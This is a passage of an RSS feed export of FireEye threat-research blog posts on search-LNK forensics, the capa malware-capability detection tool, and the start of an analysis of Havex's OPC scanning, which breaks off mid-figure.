IsUnicode, DisableKnownFolderTracking<br />\n              File attributes: FileAttributeArchive<br />    Icon index:\n            0<br />    Show window: SwNormal (Activates and displays the\n            window. The window is restored to its original size and\n            position if the window is minimized or\n        maximized.)</span></p> <p>\n          <span class=\"code\">Relative Path:\n            ..\\..\\..\\..\\..\\..\\..\\&lt;file path&gt;\\password2.txt<br />\n            Working Directory: C:\\&lt;file path&gt;</span></p> <p>\n          <span class=\"code\">--- Link information ---<br />  Flags:\n            VolumeIdAndLocalBasePath,\n        CommonNetworkRelativeLinkAndPathSuffix</span></p> <p>\n          <span class=\"code\">&gt;&gt;Volume information<br />    Drive\n            type: Fixed storage media (Hard drive)<br />    Serial\n            number: &lt;serial number&gt;<br />    Label: (No\n        label)</span></p> <p>\n          <span class=\"code\">  Network share information<br />     \n            Share name: \\\\&lt;hostname&gt;\\&lt;top level\n            folder&gt;<br />      Provider type: &lt;provider\n            type&gt;<br />      Share flags: ValidNetType</span></p> <p>\n          <span class=\"code\">  Local path: C:\\&lt;top level\n            folder&gt;\\<br />    Common path: &lt;file\n        path&gt;\\password2.txt</span></p> <p>\n          <span class=\"code\">--- Target ID information (Format: Type\n            ==&gt; Value) ---</span></p> <p>\n          <span class=\"code\">  </span>\n          <u>\n            <span class=\"code\">Absolute path: Search\n        Folder\\passw\\password2</span></u></p> <p>\n          <span class=\"code\">  </span>\n          <u>\n            <span class=\"code\">-Users property view ==&gt; Search\n              Folder<br />  </span></u>\n          <span class=\"code\">  </span>\n          <u>\n            <span class=\"code\">&gt;&gt; Property store (Format: GUID\\ID\n              Description ==&gt; Value)<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span\n              class=\"code\">d5cdd505-2e9c-101b-9397-08002b2cf9ae\\AutoList\n               ==&gt; VT_STREAM not implemented (yet) See extension\n              block section for contents for now<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span\n              class=\"code\">d5cdd505-2e9c-101b-9397-08002b2cf9ae\\AutolistCacheTime\n               ==&gt; 1849138729510<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span\n              class=\"code\">d5cdd505-2e9c-101b-9397-08002b2cf9ae\\AutolistCacheKey\n               ==&gt; Search Results in Local Disk (C:)0</span></u></p> <p>\n          <span class=\"code\">  </span>\n          <u>\n            <span class=\"code\">-Variable: Users property view ==&gt;\n              passw<br />  </span></u>\n          <span class=\"code\">  </span>\n          <u>\n            <span class=\"code\">&gt;&gt; Property store (Format: GUID\\ID\n              Description ==&gt; Value)<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span class=\"code\">1e3ee840-bc2b-476c-8237-2acd1a839b22\\2  \n                 (Description not available)         ==&gt; VT_STREAM\n              not implemented<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span class=\"code\">1e3ee840-bc2b-476c-8237-2acd1a839b22\\8  \n                 (Description not available)         ==&gt; passw<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span class=\"code\">28636aa6-953d-11d2-b5d6-00c04fd918d0\\11  \n                Item Type                           ==&gt; Stack<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span class=\"code\">28636aa6-953d-11d2-b5d6-00c04fd918d0\\25  \n                SFGAO Flags                         ==&gt;\n              805306372<br />  </span></u>\n          <span class=\"code\">     </span>\n          <u>\n            <span class=\"code\">b725f130-47ef-101a-a5f1-02608c9eebac\\10  \n                Item Name Display                   ==&gt;\n        passw</span></u></p> <p>\n          <span class=\"code\">  -Variable: Users property view ==&gt;\n            password2<br />    &gt;&gt; Property store (Format: GUID\\ID\n            Description ==&gt; Value)<br />     \n             49691c90-7e17-101a-a91c-08002b2ecda9\\3      Search Rank    \n                                ==&gt; 0<br />     \n             28636aa6-953d-11d2-b5d6-00c04fd918d0\\25     SFGAO Flags    \n                                ==&gt; 1077936503<br />     \n             28636aa6-953d-11d2-b5d6-00c04fd918d0\\32     Delegate ID\n            List                    ==&gt; VT_VECTOR data not\n            implemented (yet) See extension block section for contents\n            for now<br />       28636aa6-953d-11d2-b5d6-00c04fd918d0\\11\n                Item Type                           ==&gt; .txt<br />   \n               28636aa6-953d-11d2-b5d6-00c04fd918d0\\24     Parsing Name\n                                   ==&gt; password2.txt<br />     \n             446d16b1-8dad-4870-a748-402ea43d788c\\100    Thumbnail Cache\n            Id                  ==&gt; 7524032674880659487<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\12     (Description\n            not available)         ==&gt; Null<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\20     (Description\n            not available)         ==&gt; 1<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\3      (Description\n            not available)         ==&gt; document<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\17     (Description\n            not available)         ==&gt;\n            {1685D4AB-A51B-4AF1-A4E5-CEE87002431D}.Merge Any<br />     \n             1e3ee840-bc2b-476c-8237-2acd1a839b22\\8      (Description\n            not available)         ==&gt; C:\\&lt;file\n            path&gt;\\password2.txt<br />     \n             b725f130-47ef-101a-a5f1-02608c9eebac\\4      Item Type Text\n                                 ==&gt; Text Document<br />     \n             b725f130-47ef-101a-a5f1-02608c9eebac\\10     Item Name\n            Display                   ==&gt; password2<br />     \n             b725f130-47ef-101a-a5f1-02608c9eebac\\12     Size          \n                                 ==&gt; 19<br />     \n             b725f130-47ef-101a-a5f1-02608c9eebac\\14     Date Modified  \n                                ==&gt; 01/11/2010 16:57:11<br />     \n             006fdbaa-864f-4d1c-a8e8-e62772e454fe\\11     (Description\n            not available)         ==&gt; 59<br />     \n             006fdbaa-864f-4d1c-a8e8-e62772e454fe\\13     (Description\n            not available)         ==&gt; 1077936423<br />     \n             cf5be8c0-236c-4ad3-bace-cd608a2748d7\\100    (Description\n            not available)         ==&gt; True<br />     \n             e3e0584c-b788-4a5a-bb20-7f5a44c9acdd\\6      Item Folder\n            Path Display            ==&gt; C:\\&lt;file\n        path&gt;</span></p> <p>\n          <span class=\"code\">--- End Target ID information\n        ---</span></p> <p>\n          <span class=\"code\">--- Extra blocks information ---</span></p> <p>\n          <span class=\"code\">&gt;&gt; Property store data block (Format:\n            GUID\\ID Description ==&gt; Value)<br />     (Property store\n            is empty)</span></p> <p>\n          <span class=\"code\">&gt;&gt; Tracker database block<br />   \n             Machine ID: &lt;hostname&gt;<br />     MAC Address: &lt;mac\n            address&gt;<br />     MAC Vendor: VMWARE<br />     Creation:\n            2019-11-13 04:29:24</span></p> <p>\n          <span class=\"code\">   Volume Droid: &lt;volume&gt;<br />   \n             Volume Droid Birth: &lt;volume&gt;<br />     File Droid:\n            &lt;file&gt;<br />     File Droid birth:\n        &lt;file&gt;</span></p> </td> </tr></tbody></table>\n <p>\n  <span class=\"type-XS\">Figure 9: LECmd.exe output for password2.lnk</span></p>\n <p>The takeaway here is that user search LNK files are only related to\n  the search term and not search context. This means later searches for\n  the same search term, e.g. <span class=\"code\">passw</span>, when the\n  user subsequently opens a search result, but in a different drive or\n  directory changes the modification timestamp for the user search LNK\n  file as well as the search context contained in the user search LNK\n  file. This keeps in step with LNK shortcut files, which are dependent\n  on a simple filename—not the full file path.</p>\n <h4>Timestamp Interpretation</h4>\n <p>Historically, due to the structure of the <span\n  class=\"code\">WorldWheelQuery</span> registry key and available\n  timestamps in the Windows Registry, investigators could only determine\n  the search time of the most recent term using the last modification\n  time of the registry key. <b>With user search LNK files, new\n    timestamps are available to determine the times a user searched for\n    a specific term</b> when the user subsequently opened a file from\n  the search. Going further, we can combine evidence from the user\n  search LNK files and the <span class=\"code\">WorldWheelQuery</span>\n    <span class=\"code\">MRUlistEx</span> registry key value to<b> infer\n    the order of searches completed by the user</b>. For instance, since\n  the user searched for gov (<span class=\"code\">WorldWheelQuery</span>\n  search index 4), <span class=\"code\">passw</span> (index 6), and <span\n  class=\"code\">private</span> (index 7), we can infer they also searched\n  for <span class=\"code\">air</span> (index 5) but didn't open any files\n  resulting from this search.</p>\n <h4>Conclusion</h4>\n <p>LNK shortcut files have been a reliable method to determine user\n  access to files and the associated file metadata at the time of\n  access. With user search LNK files, we can now enrich our Windows\n  Explorer search history findings and gain a more detailed picture of\n  user activity through additional timestamps of user Explorer searches\n  with subsequent access to files from the search.</p>\n <h4>Acknowledgements</h4>\n <p>Thank you to Phillip Kealy and William Ballenthin for technical\n  review and providing feedback on overall presentation.</p>\n","descriptionType":"html","publishedDate":"Wed, 19 Feb 2020 18:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/lnk/Picture1.png","linkMd5":"7b4dd81279e883efc93c2d870ef46e1e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn24@2020_6/2020/08/24/14-11-04-987_0077a53ce1538263.webp","destWidth":972,"destHeight":452,"sourceBytes":243150,"destBytes":54684,"author":"Ashley Frazer","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/lnk/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn24@2020_6/2020/08/24/14-11-04-987_0077a53ce1538263.webp"},"publishedOrCreatedDate":1598278264229},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"capa: Automatically Identify Malware Capabilities","link":"http://www.fireeye.com/blog/threat-research/2020/07/capa-automatically-identify-malware-capabilities.html","description":"<p>capa is the FLARE team’s newest open-source tool for analyzing\n  malicious programs. Our tool provides a framework for the community to\n  encode, recognize, and share behaviors that we’ve seen in malware.\n  Regardless of your background, when you use capa, you invoke decades\n  of cumulative reverse engineering experience to figure out what a\n  program does. In this post you will learn how capa works, how to\n  install and use the tool, and why you should integrate it into your\n  triage workflow starting today.</p>\n <h4>Problem</h4>\n <p>Effective analysts can quickly understand and prioritize unknown\n  files in investigations. However, determining if a program is\n  malicious, the role it plays during an attack, and its potential\n  capabilities requires at least basic malware analysis skills. And\n  often, it takes an experienced reverse engineer to recover a file’s\n  complete functionality and guess at the author’s intent.</p>\n <p>Malware experts can quickly triage unknown binaries to gain first\n  insights and guide further analysis steps. Less experienced analysts,\n  on the other hand, oftentimes don’t know what to look for and have\n  trouble distinguishing the usual from the unusual. Unfortunately,\n  common tools like strings / <a\n  href=\"https://github.com/fireeye/flare-floss/\">FLOSS</a> or PE viewers\n  display the lowest level of detail, burdening their users to combine\n  and interpret data points.</p>\n <h4>Malware Triage 01-01</h4>\n <p>To illustrate this, let us look at Lab 01-01 from <a\n    href=\"https://nostarch.com/malware\">Practical Malware Analysis</a>\n  (PMA) available <a\n  href=\"https://practicalmalwareanalysis.com/labs/\">here</a>. Our goal\n  is to understand the program’s functionality. Figure 1 shows the\n  file’s strings and import table with interesting values highlighted.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture1.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 1: Interesting strings and import\n    information of example malware from PMA Lab 1-1</span></p>\n <p>With this data, reverse engineers can hypothesize about the strings\n  and imported API functions to guess at the program’s functionality—but\n  no more. The sample may create a mutex, start a process, or\n  communicate over the network—potentially to IP address 127.26.152.13.\n  The Winsock (WS2_32) imports make us think about network\n  functionality, but the names are not available here because they are,\n  as is common, imported by ordinal.</p>\n <p>Dynamically analyzing this sample can confirm or disprove initial\n  suspicions and reveal additional functionality. However, sandbox\n  reports or dynamic analysis tools are limited to capturing behavior\n  from the exercised code paths. This, for example, excludes any\n  functionality triggered after a successful connection to the command\n  and control (C2) server. We don’t usually recommend analyzing malware\n  with a live Internet connection.</p>\n <p>To really understand this file, we need to reverse engineer it.\n  Figure 2 shows IDA Pro’s decompilation of the program’s main function.\n  While we use the decompilation instead of disassembly to simplify our\n  explanation, similar concepts apply to both representations.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture2.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 2: Key functionality in the\n    decompiled main function of PMA Lab 1-1</span></p>\n <p>With a basic understanding of programming and the Windows API, we\n  observe the following functionality. The malware:</p>\n <ul> <li>creates a mutex to ensure only one instance is running</li>\n    <li>creates a TCP socket; indicated by the constants 2 = <span\n    class=\"code\">AF_INET</span>, 1 = <span\n    class=\"code\">SOCK_STREAM</span>, and 6 = <span\n  class=\"code\">IPPROTO_TCP</span></li> <li>connects to IP address\n    127.26.152.13 on port 80</li> <li>sends and receives data</li>\n    <li>compares received data to the strings <span\n    class=\"code\">sleep</span> and <span class=\"code\">exec</span></li>\n    <li>creates a new process</li> </ul>\n <p>Although not every code path may execute on each run, we say that\n  the malware has the capability to execute these behaviors. And, by\n  combining the individual conclusions, we can reason that the malware\n  is a backdoor that can run an arbitrary program specified by a\n  hard-coded C2 server. This high-level conclusion enables us to scope\n  an investigation and decide how to respond to the threat.</p>\n <h4>Automating Capability Identification</h4>\n <p>Of course, malware analysis is rarely as straight forward. The\n  artifacts of intent may be spread through a binary that contains\n  hundreds or thousands of functions. Furthermore, reverse engineering\n  has a fairly steep learning curve and requires solid understanding of\n  many low-level concepts such as assembly language and operating system internals.</p>\n <p>However, with enough practice, we can recognize capabilities in\n  programs simply from repetitive patterns of API calls, strings,\n  constants, and other features. With capa, we demonstrate that some of\n  our key analysis conclusions are actually feasible to perform\n  automatically. The tool provides a common yet flexible way to codify\n  expert knowledge and make it available to the entire community. When\n  you run capa, it recognizes features and patterns as a human might,\n  producing high-level conclusions that can drive subsequent\n  investigative steps. For example, when capa recognizes the ability for\n  unencrypted HTTP communication, this might be the hint you need to\n  pivot into proxy logs or other network traces.</p>\n <h4>Introducing capa</h4>\n <p>When we run capa against our example program, the tool output in\n  Figure 3 almost speaks for itself. The main table shows all identified\n  capabilities in this sample, with each entry on the left describing a\n  capability. The associated namespace on the right helps to group\n  related capabilities. capa did a fantastic job and described all the\n  program capabilities we’ve discussed in the previous section.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture3.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 3: capa analysis of PMA Lab 1-1</span></p>\n <p>We find that capa often provides surprisingly good results. That’s\n  why we want capa to always be able to show the evidence used to\n  identify a capability. Figure 4 shows capa’s detailed output for the\n  “create TCP socket” conclusion. Here, we can inspect the exact\n  locations in the binary where capa found the relevant features. We’ll\n  see the syntax of rules a bit later – in the meantime, we can surmise\n  that they’re made up of a logic tree combining low level features.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture4.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 4: Feature match details for\n    &quot;create TCP socket&quot; rule in example malware</span></p>\n <h4>How capa Works</h4>\n <p>capa consists of two main components that algorithmically triage\n  unknown programs. First, a code analysis engine extracts features from\n  files, such as strings, disassembly, and control flow. Second, a logic\n  engine finds combinations of features that are expressed in a common\n  rule format. When the logic engine finds a match, capa reports on the\n  capability described by the rule.</p>\n <p>\n  <i>Feature Extraction</i></p>\n <p>The code analysis engine extracts low-level features from programs.\n  All the features are consistent with what a human might recognize,\n  such as strings or numbers, and enable capa to explain its work. These\n  features typically fall into two large categories: file features and\n  disassembly features.</p>\n <p>File features are extracted from the raw file data and its\n  structure, e.g. the PE file header. This is information that you might\n  notice by scrolling across the entire file. Besides the above\n  discussed strings and imported APIs, these include exported function\n  and section names.</p>\n <p>Disassembly features are extracted from an advanced static analysis\n  of a file – this means disassembling and reconstructing control flow.\n  Figure 5 shows selected disassembly features including API calls,\n  instruction mnemonics, numbers, and string references.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture5.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 5: Examples of file features in a\n    disassembled code segment of PMA Lab 1-1</span></p>\n <p>Because the advanced analysis can distinguish between functions and\n  other scopes in a program, capa can apply its logic at an appropriate\n  level of detail. For example, it doesn’t get confused when unrelated\n  APIs are used in different functions since capa rules can specify that\n  they should be matched against each function independently.</p>\n <p>We’ve designed capa with flexible and extendable feature extraction\n  in mind. Additional code analysis backends can be integrated easily.\n  Currently, the capa standalone version relies on the <a\n  href=\"https://github.com/vivisect/vivisect\">vivisect</a> analysis\n  framework. If you’re using IDA Pro, you can also run capa using the\n  IDAPython backend. Note that sometimes differences among code analysis\n  engines may result in divergent feature sets and hence different\n  results. Fortunately, this usually isn’t a serious problem in practice.</p>\n <p>\n  <i>capa Rules</i></p>\n <p>A capa rule uses a structured combination of features to describe a\n  capability that may be implemented in a program. If all required\n  features are present, capa concludes that the program contains the capability.</p>\n <p>capa rules are YAML documents that contain metadata and a tree of\n  statements to express their logic. Among other things, the rule\n  language supports logical operators and counting. In Figure 6, the\n  “create TCP socket” rule says that the numbers 6, 1, and 2, <i>and</i>\n  calls to either of the API functions <span class=\"code\">socket</span>\n  or <span class=\"code\">WSASocket</span> must be present in the scope of\n  a single basic block. Basic blocks group assembly code at a very low\n  level making them an ideal place to match tightly related code\n  segments. Besides within basic blocks, capa supports matching at the\n  function and the file level. The function scope ties together all\n  features in a disassembled function, while the file scope contains all\n  features across the entire file.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture6.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 6: capa rule logic to identify TCP\n    socket creation</span></p>\n <p>Figure 7 highlights the rule metadata that enables capa to display\n  high-level, meaningful results to its users. The rule name describes\n  the identified capability while the <span\n  class=\"code\">namespace</span> associates it with a technique or\n  analysis category. We already saw the name and namespace in the\n  capability table of capa’s output. The metadata section can also\n  include fields like <span class=\"code\">author</span> or <span\n  class=\"code\">examples</span>. We use examples to reference files and\n  offsets where we know a capability to be present, enabling unit\n  testing and validation of every rule. Moreover, capa rules serve as\n  great documentation for behaviors seen in real-world malware, so feel\n  free to keep a copy around as a reference. In a future post we will\n  discuss other meta information, including capa’s support for the\n  ATT&amp;CK and the Malware Behavior Catalog frameworks.</p>\n <p>\n  <img\n    src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture7.png\" alt=\"\" />\n  <br /> <span class=\"type-XS\">Figure 7: Rule meta information</span></p>\n <h4>Installation</h4>\n <p>To make using capa as easy as possible, we provide <a\n    href=\"https://github.com/fireeye/capa/releases\">standalone\n    executables for Windows, Linux, and OSX</a>. The tool is written in\n  Python and the <a href=\"https://github.com/fireeye/capa\">source code\n    is available on our GitHub</a>. Additional and up-to-date <a\n    href=\"https://github.com/fireeye/capa/blob/master/doc/installation.md\">installation\n  instructions</a> are available in the capa repository.</p>\n <p>Newer versions of <a\n  href=\"https://www.fireeye.com/blog/threat-research/2018/11/flare-vm-update.html\">FLARE-VM</a>\n  (available on <a\n  href=\"https://github.com/fireeye/flare-vm\">GitHub</a>) include capa as well.</p>\n <h4>Usage</h4>\n <p>To identify capabilities in a program run capa and specify the input file:</p>\n <p>$ capa suspicious.exe</p>\n <p>capa supports Windows PE files (EXE, DLL, SYS) and shellcode. To run\n  capa on a shellcode file you must explicitly specify the file format\n  and architecture, for example to analyze 32-bit shellcode:</p>\n <ul> <li>\n    <span class=\"code\">$ capa -f sc32 shellcode.bin</span></li> </ul>\n <p>To obtain detailed information on identified capabilities, capa\n  supports two additional verbosity levels. To get the most detailed\n  output on where and why capa matched on rules use the very verbose option:</p>\n <ul> <li>\n    <span class=\"code\">$ capa -vv suspicious.exe</span></li> </ul>\n <p>If you only want to focus on specific rules you can use the tag\n  option to filter on fields in the rule meta section:</p>\n <ul> <li>\n    <span class=\"code\">$ capa -t &quot;create TCP socket&quot;\n  suspicious.exe</span></li> </ul>\n <p>Display capa’s help to see all supported options and consolidate the\n    <a href=\"https://github.com/fireeye/capa/tree/master/doc\">documentation</a>:</p>\n <ul> <li>\n    <span class=\"code\">$ capa -h</span></li> </ul>\n <h4>Contributing</h4>\n <p>We hope that capa brings value to the community and encourage any\n  type of contribution. Your feedback, ideas, and pull requests are very\n  welcome. The <a\n    href=\"https://github.com/fireeye/capa/blob/master/.github/CONTRIBUTING.md\">contributing\n  document</a> is a great starting point.</p>\n <p>Rules are the foundation of capa’s identification algorithm. We want\n  to make it easy and fun to write them. If you have any rule ideas,\n  please open an issue or even better submit a pull request to <a\n  href=\"https://github.com/fireeye/capa-rules\">capa-rules</a>. This way,\n  everyone can benefit from the collective knowledge of our malware\n  analysis community.</p>\n <p>To separate our work and discussions between the capa source code\n  and the supported rules, we use a second GitHub repository for <a\n    href=\"https://github.com/fireeye/capa-rules\">all rules that come\n    embedded within capa</a>. The capa main repository embeds the rule\n  repository as a git submodule. Please refer to the rules repository\n  for further details, including the <a\n    href=\"https://github.com/fireeye/capa-rules/blob/master/doc/format.md\">rule\n    format documentation</a>.</p>\n <h4>Conclusion</h4>\n <p>In this blog post we have introduced the FLARE team’s newest\n  contribution to the malware analysis community. capa is an open-source\n  framework to encode, recognize, and share behaviors seen in malware.\n  We think that the community needs this type of tool to fight back\n  against the volume of malware that we encounter during investigations,\n  hunting, and triage. Regardless of your background, when you use capa,\n  you invoke decades of cumulative experience to figure out what a\n  program does.</p>\n <p>Try out capa in your next malware analysis. The tool is extremely\n  easy to use and can provide valuable information for forensic\n  analysts, incident responders, and reverse engineers. If you enjoy the\n  tool, run into issues using it, or have any other comments, please <a\n    href=\"https://github.com/fireeye/capa/\">contact us via the projects\n    GitHub page</a>.</p>\n","descriptionType":"html","publishedDate":"Thu, 16 Jul 2020 19:40:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture1.png","linkMd5":"1713ce3c3a0b9282bdf9ca71663282c4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn30@2020_1/2020/08/24/14-11-05-005_41b914df61ccafb9.webp","destWidth":970,"destHeight":572,"sourceBytes":305190,"destBytes":138550,"author":"Willi Ballenthin","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn30@2020_1/2020/08/24/14-11-05-005_41b914df61ccafb9.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn96@2020_1/2020/08/24/14-11-10-612_8624d7eb92ed5fc5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn93@2020_3/2020/08/24/14-11-13-835_45f4f9743b32ca1e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn6@2020_2/2020/08/24/14-11-13-056_bee45e0b2832c628.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn45@2020_4/2020/08/24/14-11-16-464_66207d3683c438e7.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn65@2020_4/2020/08/24/14-11-15-733_425de8da6e685bca.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/capa/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn92@2020_3/2020/08/24/14-11-18-090_8f53583b939dbf9e.webp"},"publishedOrCreatedDate":1598278264182},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Havex, It’s Down With OPC","link":"http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html","description":"<p>FireEye recently analyzed the capabilities of a variant of Havex (referred to by FireEye as “Fertger” or “PEACEPIPE”), the first publicized malware reported to actively scan OPC servers used for controlling SCADA (Supervisory Control and Data Acquisition) devices in critical infrastructure (e.g., water and electric utilities), energy, and manufacturing sectors.</p> \n<p>While Havex itself is a somewhat simple PHP Remote Access Trojan (RAT) that has been analyzed by other sources, none of these have covered the scanning functionality that could impact <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">SCADA devices and other industrial control systems (ICS)</a>. Specifically, this Havex variant targets servers involved in OPC (Object linking and embedding for Process Control) communication, a client/server technology widely used in process control systems (for example, to control water pumps, turbines, tanks, etc.).</p> \n<p> <i>Note: ICS is a general term that encompasses SCADA (Supervisory Control and Data Acquisition) systems, DCS (Distributed Control Systems), and other control system environments. The term SCADA is well-known to wider audiences, and throughout this article, ICS and SCADA will be used interchangeably.</i></p> \n<p>Threat actors have leveraged Havex in attacks across the energy sector for over a year, but the full extent of industries and ICS systems affected by Havex is unknown. We decided to examine the OPC scanning component of Havex more closely, to better understand what happens when it’s executed and the possible implications.</p> \n<p> <b>OPC Testing Environment</b></p> \n<p>To conduct a true test of the Havex variant’s functionality, we constructed an OPC server test environment that fully replicates a typical OPC server setup (Figure 1<a href=\"http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html#_ftn3\"><sup> <sup>[3]</sup></sup></a>). As shown, ICS or SCADA systems involve OPC client software that interacts directly with an OPC server, which works in tandem with the PLC (Programmable Logic Controller) to control industrial hardware (such as a water pump, turbine, or tank). FireEye replicated both the hardware and software the OPC server setup (the components that appear within the dashed line on the right side of Figure 1).</p> \n<p>&nbsp;</p> \n<div> \n <p>&nbsp;</p> \n <p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/havex1.png\"><img width=\"458\" height=\"183\" class=\"aligncenter  wp-image-5991 landscape-sm\" alt=\"havex1\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex1.png\" /></a><b></b></p> \n <p style=\"text-align: center;\"> <b>Figure 1: Topology of typical OPC server setup</b></p> \n <p>The components of our test environment are robust and comprehensive to the point that our system could be deployed in an environment to control actual SCADA devices. We utilized an Arduino Uno<a href=\"http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html#_ftn1\"><sup> <sup>[1]</sup></sup></a> as the primary hardware platform, acting as the OPC server. The Arduino Uno is an ideal platform for developing an ICS test environment because of the low power requirements, a large number of libraries to make programming the microcontroller easier, serial communication over USB, and cheap cost. We leveraged the OPC Server and libraries from St4makers<a href=\"http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html#_ftn2\"><sup> <sup>[2]</sup></sup></a> (as shown in Figure 2). This software is available for free to SCADA engineers to allow them to develop software to communicate information to and from SCADA devices.</p> \n <p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/havex2.png\"><img width=\"288\" height=\"201\" class=\"aligncenter  wp-image-5990 landscape-sm\" alt=\"havex2\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex2.png\" /></a></p> \n <p style=\"text-align: center;\"> <b>Figure 2: OPC Server Setup</b></p> \n <p>Using the OPC Server libraries allowed us to make the Arduino Uno act as a true, functioning OPC SCADA device (Figure 3).</p> \n <p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/havex3.png\"><img width=\"265\" height=\"200\" class=\" wp-image-5989 aligncenter landscape-sm\" alt=\"havex3\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex3.png\" /></a></p> \n <p style=\"text-align: center;\"> <b>Figure 3: Matrikon OPC Explorer showing Arduino OPC Server</b></p> \n <p>We also used Matrikon’s OPC Explorer<a href=\"http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html#_ftn1\"><sup> <sup>[1]</sup></sup></a>, which enables browsing between the Arduino OPC server and the Matrikon embedded simulation OPC server. In addition, the Explorer can be used to add certain data points to the SCADA device – in this case, the Arduino device.</p> \n <p style=\"text-align: center;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/havex4.png\"><img width=\"393\" height=\"157\" class=\"aligncenter  wp-image-5988 landscape-sm\" alt=\"havex4\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/havex4.png\" /></a></p> \n <p style=\"text-align: center;\"> <b>Figure 4: Tags identified for OPC server</b></p> \n <p>In the OPC testing environment, we created tags in order to simulate a true OPC server functioning. Tags, in relation to ICS devices, are single data points. For example: temperature, vibration, or fill level. Tags represent a single value monitored or controlled by the system at a single point in time.</p> \n <p>With our test environment complete, we executed the malicious Havex “.dll\" file and analyzed how Havex’s OPC scanning module might affect OPC servers it comes in contact with.</p> \n <p> <b>Analysis</b></p> \n <p>The particular Havex sample we looked at was a file named PE.dll (6bfc42f7cb1364ef0bfd749776ac6d38). When looking into the scanning functionality of the particular Havex sample, it directly scans for OPC servers, both on the server the sample was submitted on, and laterally, across the entire network.</p> \n <p style=\"text-align: left;\">The scanning process starts when the Havex downloader calls the runDll export function.&nbsp; The OPC scanner module identifies potential OPC servers by using the Windows networking (WNet) functions.&nbsp; Through recursive calls to WNetOpenEnum and WNetEnumResources, the scanner builds a list of all servers that are globally accessible through Windows networking.&nbsp; The list of servers is then checked to determine if any of them host an interface to the Component Object Models (COM) listed below:</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <div> \n  <p>&nbsp;</p> \n  <p style=\"text-align: left;\"> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.31.56-PM.png\"><img width=\"547\" height=\"191\" class=\"alignnone  wp-image-6030 landscape-med\" alt=\"Screen Shot 2014-07-17 at 12.31.56 PM\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.31.56-PM.png\" /></a></p> \n  <p>&nbsp;</p> \n </div> \n <p>&nbsp;</p> \n <p style=\"text-align: center;\"> <b>Figure 5: 